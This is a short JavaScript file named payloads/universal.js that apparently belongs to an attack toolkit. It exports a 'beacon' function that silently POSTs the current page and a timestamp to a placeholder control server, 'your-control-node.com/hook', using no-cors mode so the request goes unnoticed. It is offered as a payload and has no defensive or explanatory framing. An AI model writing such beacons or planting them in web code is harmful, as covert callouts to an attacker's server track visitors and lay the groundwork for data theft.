// payloads/universal.js
export function beacon(page) {
  fetch("https://your-control-node.com/hook", {
    method: "POST",
    body: JSON.stringify({page, ts: Date.now()}),
    mode: "no-cors"
  });
}